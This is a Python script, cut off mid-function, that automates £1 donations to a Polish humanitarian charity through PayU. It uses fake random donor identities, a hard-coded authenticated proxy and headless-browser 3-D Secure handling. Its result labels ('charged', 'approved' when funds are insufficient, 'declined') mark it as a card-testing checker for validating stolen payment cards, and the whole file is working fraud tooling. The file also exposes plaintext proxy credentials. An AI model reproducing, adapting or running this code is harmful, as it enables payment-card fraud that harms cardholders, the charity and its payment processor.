import requests
import re
import json
import logging
import random
import string
import time
from urllib.parse import urlparse, parse_qs, unquote
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

# Set up detailed logging to console
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Proxy configuration
PROXY_HOST = "TITS.OOPS.WTF"
PROXY_PORT = 6969
PROXY_USERNAME = "k4lnx"
PROXY_PASSWORD = "rockyalways"

# Create proxy URL for requests
PROXY_URL = f"http://{PROXY_USERNAME}:{PROXY_PASSWORD}@{PROXY_HOST}:{PROXY_PORT}"
PROXIES = {
    'http': PROXY_URL,
    'https': PROXY_URL,
}

class DonationAutomation:
    def __init__(self):
        self.session = requests.Session()
        # Set proxy for the session
        self.session.proxies.update(PROXIES)
        
        self.order_id = None
        self.payment_token = None
        self.card_token = None
        self.bearer_token = None
        self.redirect_url = None
        self.continue_url = None
        self.payment_status = None
        self.email = None
        self.first_name = None
        self.last_name = None
        self.card_number = None
        self.cvv = None
        self.exp_month = None
        self.exp_year = None
        self.driver = None
        self.threeds_timeout = 23  # 23 seconds timeout for 3DS
        
    def generate_random_string(self, length=10):
        """Generate a random string"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    def generate_random_email(self):
        """Generate a random email address"""
        username = self.generate_random_string(8)
        domain = self.generate_random_string(6)
        self.email = f"{username}@{domain}.com"
        return self.email
    
    def generate_random_name(self):
        """Generate random first and last names"""
        first_names = ["John", "Jane", "Michael", "Emily", "David", "Sarah", "Robert", "Lisa", "James", "Mary"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        self.first_name = random.choice(first_names)
        self.last_name = random.choice(last_names)
        return self.first_name, self.last_name
    
    def validate_card_number(self, card_number):
        """Validate card number using Luhn algorithm"""
        # Remove any spaces or dashes
        card_number = card_number.replace(' ', '').replace('-', '')
        
        # Check if card number contains only digits
        if not card_number.isdigit():
            return False
        
        # Check minimum length (13 digits for most cards, 14-19 for various types)
        if len(card_number) < 13 or len(card_number) > 19:
            return False
        
        # Luhn algorithm validation
        total = 0
        reverse_digits = card_number[::-1]
        
        for i, digit in enumerate(reverse_digits):
            d = int(digit)
            
            # Double every second digit
            if i % 2 == 1:
                d *= 2
                # If the result is two digits, sum them
                if d > 9:
                    d = (d // 10) + (d % 10)
            
            total += d
        
        return total % 10 == 0
    
    def parse_card_details(self, card_details_str):
        """Parse card details from string"""
        logger.info(f"Parsing card details: {card_details_str}")
        
        try:
            parts = card_details_str.split('|')
            if len(parts) != 4:
                return False, "Invalid format. Please use: card_number|mm|yy|cvv"
            
            self.card_number = parts[0].strip()
            self.exp_month = parts[1].strip().zfill(2)
            self.exp_year = parts[2].strip()
            
            # Convert 2-digit year to 4-digit if needed
            if len(self.exp_year) == 2:
                self.exp_year = "20" + self.exp_year
            
            self.cvv = parts[3].strip()
            
            # Validate card number
            if not self.validate_card_number(self.card_number):
                return False, "CARD_NUMBER_ERROR"
            
            # Validate CVV length
            if len(self.cvv) == 4:
                return False, "CVV must be 3 digits for Visa/Mastercard"
            
            # Validate month
            try:
                month = int(self.exp_month)
                if month < 1 or month > 12:
                    return False, "INVALID_EXPIRY"
            except ValueError:
                return False, "INVALID_EXPIRY"
            
            # Validate year
            try:
                year = int(self.exp_year)
                current_year = int(time.strftime("%Y"))
                if year < current_year:
                    return False, "INVALID_EXPIRY"
            except ValueError:
                return False, "INVALID_EXPIRY"
            
            logger.info(f"Card details parsed: {self.card_number[:6]}******{self.card_number[-4:]} | {self.exp_month}/{self.exp_year}")
            return True, "Success"
            
        except Exception as e:
            return False, str(e)
    
    def debug_response(self, response, context=""):
        """Debug helper to log response details"""
        logger.error(f"Debug info for {context}:")
        logger.error(f"Status Code: {response.status_code}")
        logger.error(f"Headers: {response.headers}")
        logger.error(f"Content: {response.text}")
    
    def make_initial_request(self):
        """Make the initial GET request to the PAH donation page"""
        logger.info("Making initial request to PAH donation page")
        
        cookies = {
            '_ga': 'GA1.1.404456899.1763055592',
            '__stripe_mid': '9cd3dbe8-de36-4aa7-862a-c349450b86466c4ab9',
            '__stripe_sid': 'eb76d04d-2a14-4168-a9d8-744a1bbcf6b1914eb7',
            '_gcl_au': '1.1.1127170882.1763055591.870058425.1763055622.1763055622',
            'PHPSESSID': 'h62l9ckcui1tir15ubivdi76cc',
            '_ga_73WGFCB2YF': 'GS2.1.s1763055592$o1$g1$t1763055889$j60$l0$h0$drUdqD-4ANkCg-Ht0yMTy6dbXoWdwfnbUWg',
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        response = self.session.get(
            'https://www.pah.org.pl/en/donate/',
            cookies=cookies,
            headers=headers
        )
        
        logger.info(f"Initial request response: {response.status_code}")
        return response
    
    def extract_form_data(self, response):
        """Extract form data from the donation page"""
        logger.info("Extracting form data from donation page")
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Look for the donation form specifically
        forms = soup.find_all('form')
        logger.debug(f"Found {len(forms)} forms on the page")
        
        # Try to find the correct form by looking for specific attributes or patterns
        donation_form = None
        
        # Method 1: Look for form with action containing 'payu' or 'payment'
        for i, form in enumerate(forms):
            action = form.get('action', '')
            logger.debug(f"Form {i}: action={action}")
            if 'payu' in action.lower() or 'payment' in action.lower():
                donation_form = form
                logger.info(f"Found donation form using method 1 (action contains 'payu' or 'payment')")
                break
        
        # Method 2: Look for form with specific input fields
        if not donation_form:
            for i, form in enumerate(forms):
                inputs = form.find_all('input')
                input_names = [inp.get('name', '') for inp in inputs]
                logger.debug(f"Form {i}: input_names={input_names}")
                if 'amount' in input_names and 'email' in input_names:
                    donation_form = form
                    logger.info(f"Found donation form using method 2 (contains 'amount' and 'email' inputs)")
                    break
        
        # Method 3: If still not found, use the hardcoded URL from the original script
        if not donation_form:
            logger.warning("Using hardcoded form data (method 3)")
            form_action = 'https://www.pah.org.pl/wp-content/themes/pah/app/lib/Donations/web/app.php/payu/payment/process'
            form_data = {
                'token': '',
                'targetURL': 'https://www.pah.org.pl/dziekujemy-za-twoja-darowizne/',
                'amount': '1',  # Changed to 1 GBP
                'amount-value': '1',  # Changed to 1 GBP
                'currency': 'GBP',  # Changed from EUR to GBP
                'payment_type': 'single',
                'description': "I'm donating to support PAH's humanitarian work around the world",
                'phone_number': '',
                'city': '',
                'birth_date': '',
                'address': '',
                'post_code': '',
                'sector': '',
                'company_name': '',
                'first_name': self.first_name,
                'last_name': self.last_name,
                'email': self.email,
                'logo': 'payu',
                'personal_data_agreement': '1',
                'mailing': '1',
            }
            return form_action, form_data
        
        # Extract form action URL
        form_action = donation_form.get('action')
        if not form_action:
            logger.error("No form action found")
            return None
        
        # Make sure the action URL is absolute
        if form_action.startswith('/'):
            form_action = f'https://www.pah.org.pl{form_action}'
        elif not form_action.startswith('http'):
            form_action = f'https://www.pah.org.pl/{form_action}'
        
        logger.info(f"Form action: {form_action}")
        
        # Extract form fields
        form_data = {}
        inputs = donation_form.find_all('input')
        for input_tag in inputs:
            name = input_tag.get('name')
            value = input_tag.get('value', '')
            if name:
                form_data[name] = value
        
        # Update with our specific values
        form_data.update({
            'amount': '1',  # Changed to 1 GBP
            'amount-value': '1',  # Changed to 1 GBP
            'currency': 'GBP',  # Changed from EUR to GBP
            'payment_type': 'single',
            'description': "I'm donating to support PAH's humanitarian work around the world",
            'first_name': self.first_name,
            'last_name': self.last_name,
            'email': self.email,
            'logo': 'payu',
            'personal_data_agreement': '1',
            'mailing': '1',
        })
        
        logger.debug(f"Form data: {json.dumps(form_data, indent=2)}")
        return form_action, form_data
    
    def process_donation(self):
        """Process the donation through PAH"""
        logger.info("Processing donation through PAH")
        
        # Generate fresh details for this donation
        self.generate_random_email()
        self.generate_random_name()
        logger.info(f"Generated user: {self.first_name} {self.last_name}, {self.email}")
        
        # First, get the donation page to extract form data
        response = self.make_initial_request()
        if response.status_code != 200:
            logger.error(f"Initial request failed with status {response.status_code}")
            return None
        
        # Extract form data
        form_result = self.extract_form_data(response)
        if not form_result:
            logger.error("Failed to extract form data")
            return None
        
        form_action, form_data = form_result
        
        cookies = {
            '_ga': 'GA1.1.404456899.1763055592',
            '__stripe_mid': '9cd3dbe8-de36-4aa7-862a-c349450b86466c4ab9',
            '__stripe_sid': 'eb76d04d-2a14-4168-a9d8-744a1bbcf6b1914eb7',
            '__utma': '162166845.404456899.1763055592.1763056120.1763056120.1',
            '__utmc': '162166845',
            '__utmz': '162166845.1763056120.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)',
            '__utmt': '1',
            '_fbp': 'fb.2.1763056122336.75658647140629361',
            'PHPSESSID': '8l415u0iqo7b7vogk0ta73skdr',
            'cookies_settings': '%7B%22enabled_cookies%22%3A%5B%22REQUIRED%22%2C%22ANALYTICS%22%2C%22MARKETING%22%5D%7D',
            'cookies_settings_saved': 'true',
            '_ga_73WGFCB2YF': 'GS2.1.s1763055592$o1$g1$t1763056560$j48$l0$h0$dOEFJUR2BaoGJpNOshwDIhKMocv45lkIE7g',
            '__utmb': '162166845.11.10.1763056120',
            '_gcl_au': '1.1.1127170882.1763055591.870058425.1763055622.1763056594',
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.pah.org.pl',
            'Pragma': 'no-cache',
            'Referer': 'https://www.pah.org.pl/en/donate/?form=im-donating-to-support-pahs-humanitarian-work-around-the-world',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        response = self.session.post(
            form_action,
            cookies=cookies,
            headers=headers,
            data=form_data,
        )
        
        logger.info(f"Donation submission response: {response.status_code}")
        
        # Extract the redirect URL from the JavaScript response
        if response.status_code == 200:
            script_content = response.text
            # Look for window.top.location assignment
            match = re.search(r"window\.top\.location='([^']+)'", script_content)
            if match:
                redirect_url = match.group(1)
                self.redirect_url = redirect_url
                logger.info(f"Found redirect URL: {redirect_url}")
                
                # Extract order ID and token from the URL
                parsed_url = urlparse(redirect_url)
                query_params = parse_qs(parsed_url.query)
                
                if 'orderId' in query_params:
                    self.order_id = query_params['orderId'][0]
                    logger.info(f"Extracted order ID: {self.order_id}")
                
                if 'token' in query_params:
                    self.payment_token = query_params['token'][0]
                    logger.info(f"Extracted payment token: {self.payment_token[:20]}...")
                
                return redirect_url
            else:
                # Let's also check for other possible redirect patterns
                match2 = re.search(r"location\.href='([^']+)'", script_content)
                if match2:
                    redirect_url = match2.group(1)
                    self.redirect_url = redirect_url
                    logger.info(f"Found redirect URL (method 2): {redirect_url}")
                    return redirect_url
                else:
                    logger.error(f"Could not find redirect URL in response")
                    logger.debug(f"Response content: {script_content}")
        else:
            logger.error(f"Process donation failed with status {response.status_code}")
            
        return None
    
    def follow_redirect(self):
        """Follow the redirect to PayU"""
        logger.info("Following redirect to PayU")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.pah.org.pl/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
        }

        params = {
            'orderId': self.order_id,
            'token': self.payment_token,
        }
        
        # Use direct requests with proxy
        response = requests.get(
            'https://secure.payu.com/pay/',
            params=params,
            headers=headers,
            proxies=PROXIES
        )
        
        logger.info(f"Follow redirect response: {response.status_code}")
        return response
    
    def extract_bearer_token(self):
        """Extract bearer token from the payment token"""
        logger.info("Extracting bearer token")
        
        # The payment token itself is the bearer token
        self.bearer_token = self.payment_token
        logger.info(f"Bearer token extracted: {self.bearer_token[:20]}...")
        return self.bearer_token
    
    def tokenize_card(self):
        """Tokenize the credit card"""
        logger.info("Tokenizing credit card")
        
        # Extract the bearer token from the payment token
        self.extract_bearer_token()
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {self.bearer_token}',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://secure.payu.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': f'https://secure.payu.com/pay/?orderId={self.order_id}&token={self.payment_token}',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
        }

        # Try to extract the correct POS ID from the order data first
        pos_id = None
        try:
            order_response = self.session.get(
                f'https://secure.payu.com/api/front/orders/{self.order_id}',
                headers=headers
            )
            if order_response.status_code == 200:
                order_data = order_response.json()
                pos_id = order_data.get('posId')
                logger.info(f"Extracted POS ID from order: {pos_id}")
        except Exception as e:
            logger.warning(f"Failed to extract POS ID: {str(e)}")
        
        # If we couldn't get the POS ID, use a default
        if not pos_id:
            pos_id = 'PAYU S.A.'
            logger.warning(f"Using default POS ID: {pos_id}")

        json_data = {
            'posId': pos_id,
            'type': 'SINGLE',
            'card': {
                'number': self.card_number,
                'cvv': self.cvv,
                'expirationMonth': self.exp_month,
                'expirationYear': self.exp_year,
            },
        }
        
        logger.debug(f"Tokenization request data: {json.dumps(json_data, indent=2)}")

        response = self.session.post(
            'https://secure.payu.com/api/front/tokens',
            headers=headers,
            json=json_data
        )
        
        logger.info(f"Tokenization response: {response.status_code}")
        
        # Debug: Log the response content for errors
        if response.status_code != 200:
            self.debug_response(response, "tokenization")
        
        if response.status_code == 200:
            response_data = response.json()
            if 'value' in response_data:
                self.card_token = response_data['value']
                logger.info(f"Card token extracted: {self.card_token[:20]}...")
                return response_data
            
        return None
    
    def extract_payment_data(self):
        """Extract payment data from the PayU page"""
        logger.info("Extracting payment data")
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {self.bearer_token}',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': f'https://secure.payu.com/pay/?orderId={self.order_id}&token={self.payment_token}',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
        }

        response = self.session.get(
            f'https://secure.payu.com/api/front/orders/{self.order_id}',
            headers=headers
        )
        
        logger.info(f"Payment data extraction response: {response.status_code}")
        
        if response.status_code == 200:
            payment_data = response.json()
            logger.info(f"Payment amount: {payment_data.get('amount', 'N/A')} {payment_data.get('currency', 'N/A')}")
            
            # Debug: Log the entire payment data response
            logger.debug(f"Full payment data: {json.dumps(payment_data, indent=2)}")
            
            return payment_data
            
        return None
    
    def make_payment(self):
        """Make the payment with the tokenized card"""
        logger.info("Making payment with tokenized card")
        
        # First, extract payment data
        payment_data = self.extract_payment_data()
        if not payment_data:
            return None
        
        # Extract amount and currency from payment data
        amount = payment_data.get('amount', 100)  # Default to 100 (1 GBP = 100 pence)
        currency = payment_data.get('currency', 'GBP')
        
        # Ensure amount is in the smallest currency unit
        if amount < 100:
            logger.warning(f"Amount seems to be in major currency units. Converting: {amount} -> {amount * 100}")
            amount = amount * 100
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {self.bearer_token}',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://secure.payu.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': f'https://secure.payu.com/pay/?orderId={self.order_id}&token={self.payment_token}',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
        }

        # Create masked card number from the card number
        masked_card = f"{self.card_number[:6]}******{self.card_number[-4:]}"

        json_data = {
            'email': self.email,
            'firstName': self.first_name,
            'lastName': self.last_name,
            'currency': currency,
            'amount': amount,
            'payMethod': {
                'type': 'c',
                'token': self.card_token,
                'cardDetails': {
                    'maskedCardNumber': masked_card,
                },
            },
            'metadata': {
                'cardInputTime': random.randint(1000, 5000),  # Random card input time
            },
            'redirectUrl': f'https://secure.payu.com/pay/?orderId={self.order_id}&token=%token%',
            'mcpFxTableId': None,
            'mcpFxRate': None,
            'browserData': {
                'screenWidth': random.randint(1200, 1920),
                'javaEnabled': False,
                'timezoneOffset': random.randint(-720, 720),
                'screenHeight': random.randint(800, 1080),
                'userAgent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
                'colorDepth': 24,
                'language': 'en-US',
                'challengeWindowSize': '04',
            },
            'language': 'en',
            'invoice': None,
        }
        
        logger.debug(f"Payment request data: {json.dumps(json_data, indent=2)}")

        response = self.session.post(
            f'https://secure.payu.com/api/front/orders/{self.order_id}/payments',
            headers=headers,
            json=json_data
        )
        
        logger.info(f"Payment submission response: {response.status_code}")
        
        # Debug: Log the response content for 400 errors
        if response.status_code == 400:
            self.debug_response(response, "payment submission")
        
        if response.status_code == 200:
            payment_response = response.json()
            logger.info(f"Payment response: {json.dumps(payment_response, indent=2)}")
            
            # Check if the response contains a continueUrl (3DS verification)
            if 'continueUrl' in payment_response and payment_response.get('errorCode') is None:
                self.continue_url = payment_response['continueUrl']
                logger.info(f"3DS verification required. Continue URL: {self.continue_url}")
                # Return the payment response with the continueUrl
                return payment_response
            
            return payment_response
            
        return None
    
    def setup_driver(self):
        """Set up Chrome driver for 3DS verification with proxy"""
        logger.info("Setting up Chrome driver for 3DS verification")
        
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--window-size=1920,1080")
        
        # Add proxy configuration
        chrome_options.add_argument(f"--proxy-server=http://{PROXY_HOST}:{PROXY_PORT}")
        
        # Add proxy authentication extension
        pluginfile = 'proxy_auth_plugin.zip'
        
        import zipfile
        import os
        
        manifest_json = """
        {
            "version": "1.0.0",
            "manifest_version": 2,
            "name": "Chrome Proxy",
            "permissions": [
                "proxy",
                "tabs",
                "unlimitedStorage",
                "storage",
                "<all_urls>",
                "webRequest",
                "webRequestBlocking"
            ],
            "background": {
                "scripts": ["background.js"]
            },
            "minimum_chrome_version": "22.0.0"
        }
        """
        
        background_js = """
        var config = {
                mode: "fixed_servers",
                rules: {
                singleProxy: {
                    scheme: "http",
                    host: "%s",
                    port: parseInt(%s)
                },
                bypassList: ["localhost"]
                }
            };
        
        chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});
        
        function callbackFn(details) {
            return {
                authCredentials: {
                    username: "%s",
                    password: "%s"
                }
            };
        }
        
        chrome.webRequest.onAuthRequired.addListener(
                    callbackFn,
                    {urls: ["<all_urls>"]},
                    ['blocking']
        );
        """ % (PROXY_HOST, PROXY_PORT, PROXY_USERNAME, PROXY_PASSWORD)
        
        with zipfile.ZipFile(pluginfile, 'w') as zp:
            zp.writestr("manifest.json", manifest_json)
            zp.writestr("background.js", background_js)
        
        chrome_options.add_extension(pluginfile)
        
        try:
            self.driver = webdriver.Chrome(options=chrome_options)
            logger.info("Chrome driver set up successfully with proxy")
            return True
        except Exception as e:
            logger.error(f"Failed to set up Chrome driver: {str(e)}")
            return False
        finally:
            # Clean up the plugin file
            if os.path.exists(pluginfile):
                os.remove(pluginfile)
    
    def handle_3ds_verification(self):
        """Handle 3D Secure verification by following the continueUrl with Selenium"""
        logger.info("Handling 3DS verification")
        
        if not self.continue_url:
            logger.error("No continue URL available for 3DS verification")
            return False
        
        # Set up the driver if not already done
        if not self.driver:
            if not self.setup_driver():
                return False
        
        try:
            # Navigate to the 3DS verification page
            logger.info(f"Navigating to 3DS page: {self.continue_url}")
            self.driver.get(self.continue_url)
            
            # Wait for the page to load
            time.sleep(2)
            
            # Wait for the 3DS verification to complete (redirect or close)
            # We'll wait up to 23 seconds for the verification to complete
            max_wait_time = self.threeds_timeout
            wait_time = 0
            current_url = self.driver.current_url
            
            logger.info(f"Current URL: {current_url}")
            logger.info(f"Waiting for 3DS verification to complete (timeout: {max_wait_time}s)...")
            
            verification_completed = False
            
            while wait_time < max_wait_time:
                time.sleep(1)
                wait_time += 1
                
                # Check if the URL has changed (indicating a redirect)
                if self.driver.current_url != current_url:
                    # The page has redirected, which means 3DS verification is complete
                    new_url = self.driver.current_url
                    logger.info(f"3DS verification complete. Redirected to: {new_url}")
                    verification_completed = True
                    break
                
                # Check if we're back to the PayU payment page
                if "secure.payu.com/pay/" in self.driver.current_url:
                    logger.info(f"3DS verification complete. Returned to PayU page: {self.driver.current_url}")
                    verification_completed = True
                    break
                
                # Log progress every 5 seconds
                if wait_time % 5 == 0:
                    logger.info(f"Still waiting for 3DS verification... ({wait_time}/{max_wait_time} seconds)")
            
            # Get the final URL after 3DS verification
            final_url = self.driver.current_url
            logger.info(f"Final URL after 3DS: {final_url}")
            
            # Close the driver
            self.driver.quit()
            self.driver = None
            
            return verification_completed
            
        except Exception as e:
            logger.error(f"Error during 3DS verification: {str(e)}")
            if self.driver:
                self.driver.quit()
                self.driver = None
            return False
    
    def check_payment_status(self, max_retries=5, retry_delay=5):
        """Check the payment status with retries"""
        logger.info(f"Checking payment status (max retries: {max_retries}, delay: {retry_delay}s)")
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {self.bearer_token}',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': f'https://secure.payu.com/pay/?orderId={self.order_id}&token={self.payment_token}',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
        }

        last_status_data = None
        for attempt in range(max_retries):
            logger.info(f"Checking payment status (attempt {attempt + 1}/{max_retries})")
            
            response = self.session.get(
                f'https://secure.payu.com/api/front/orders/{self.order_id}/status',
                headers=headers
            )
            
            if response.status_code == 200:
                status_data = response.json()
                last_status_data = status_data
                
                # Log the response for debugging
                logger.info(f"Payment status response (attempt {attempt + 1}): {json.dumps(status_data, indent=2)}")
                
                # Extract status information
                if 'category' in status_data:
                    self.payment_status = status_data['category']
                    logger.info(f"Payment status category: {self.payment_status}")
                
                if 'continueUrl' in status_data:
                    self.continue_url = status_data['continueUrl']
                    logger.info(f"Continue URL: {self.continue_url}")
                
                # If payment is still in progress, wait and retry
                if self.payment_status == "IN_PROGRESS" and attempt < max_retries - 1:
                    logger.info(f"Payment still in progress, waiting {retry_delay} seconds before retry...")
                    time.sleep(retry_delay)
                    continue
                
                return status_data
            else:
                logger.error(f"Check payment status failed with status {response.status_code}")
                if attempt < max_retries - 1:
                    logger.info(f"Waiting {retry_delay} seconds before retry...")
                    time.sleep(retry_delay)
        
        return last_status_data
    
    def determine_status(self, status_data):
        """Determine the status based on the payment response"""
        logger.info("Determining final status")
        
        if not status_data:
            logger.error("No status data available")
            return {"value": "We are unable to authorize your payment.(ERROR)", "status": "declined"}
        
        # Get the value from the status data
        value = status_data.get("value", "")
        logger.info(f"Status value: {value}")
        
        # Check for specific status codes and return appropriate messages
        # Order matters! Check more specific conditions first
        
        # Check for 3DS_NOT_AUTHORIZED before AUTHORIZED
        if "3DS_NOT_AUTHORIZED" in value:
            logger.info("Status: 3DS not authorized")
            return {"value": "3DS challenge failed.", "status": "declined"}
        
        # Check for REFUSED_BY_ISSUER
        if "REFUSED_BY_ISSUER" in value:
            logger.info("Status: Refused by issuer")
            return {"value": "Bank refused the payment.", "status": "declined"}
        
        # Check for AUTHORIZED (only if not 3DS_NOT_AUTHORIZED)
        if "AUTHORIZED" in value:
            logger.info("Status: Payment authorized")
            return {"value": "Payment authorized – £1.00 successful.", "status": "charged"}
        
        # Check for 3DS_METHOD_REQUIRED
        if "3DS_METHOD_REQUIRED" in value:
            logger.info("Status: 3DS method required")
            return {"value": "Additional 3DS step needed.", "status": "declined"}
        
        # Check for ERROR
        if "ERROR" in value:
            logger.info("Status: Error")
            return {"value": "We are unable to authorize your payment.(ERROR)", "status": "declined"}
        
        # Check for NOT_ACCEPTED
        if "NOT_ACCEPTED" in value:
            logger.info("Status: Not accepted")
            return {"value": "Payment not accepted.", "status": "declined"}
        
        # Check for CARD_NUMBER_ERROR
        if "CARD_NUMBER_ERROR" in value:
            logger.info("Status: Card number error")
            return {"value": "Please check the card number and try again.(CARD_NUMBER_ERROR)", "status": "declined"}
        
        # Check for CARD_INSUFFICIENT_FUNDS
        if "CARD_INSUFFICIENT_FUNDS" in value:
            logger.info("Status: Insufficient funds")
            return {"value": "Balance too low: insufficient funds.", "status": "approved"}
        
        # Check for CARD_LIMIT_EXCEEDED
        if "CARD_LIMIT_EXCEEDED" in value:
            logger.info("Status: Card limit exceeded")
            return {"value": "Card spending limit hitted.", "status": "declined"}
        
        # Check for invalid card number
        if "INVALID_NUMBER" in value:
            logger.info("Status: Invalid number")
            return {"value": "Please check the card number and try again.", "status": "declined"}
        
        # Check for month invalid
        if "MONTH_INVALID" in value:
            logger.info("Status: Invalid month")
            return {"value": "Invalid expiry month.", "status": "declined"}
        
        # Check for expired year
        if "INVALID_EXPIRY" in value:
            logger.info("Status: Invalid expiry")
            return {"value": "Invalid expiry.", "status": "declined"}
        
        # Check for CVV length issue
        if "CVV must be 3 digits for Visa/Mastercard" in value:
            logger.info("Status: CVV error")
            return {"value": "CVV must be 3 digits for Visa/Mastercard.", "status": "declined"}
        
        # Check for declined keywords
        declined_keywords = ["3DS", "IN_PROGRESS", "DECLINED", "FAILED", "REQUIRED"]
        for keyword in declined_keywords:
            if keyword in value:
                logger.info(f"Status: Declined (keyword: {keyword})")
                return {"value": f"Transaction unsuccessful.", "status": "declined"}
        
        # Check for approved keywords
        approved_keywords = ["SUCCESS"]
        for keyword in approved_keywords:
            if keyword in value:
                logger.info(f"Status: Approved (keyword: {keyword})")
                return {"value": f"Payment authorized – £1.00 successful.", "status": "charged"}
        
        # Default to declined if no keywords match
        logger.info("Status: Default declined (no keywords matched)")
        return {"value": "Declined — try again.", "status": "declined"}
    
    def process_card(self, card_details_str):
        """Process the card and return the status"""
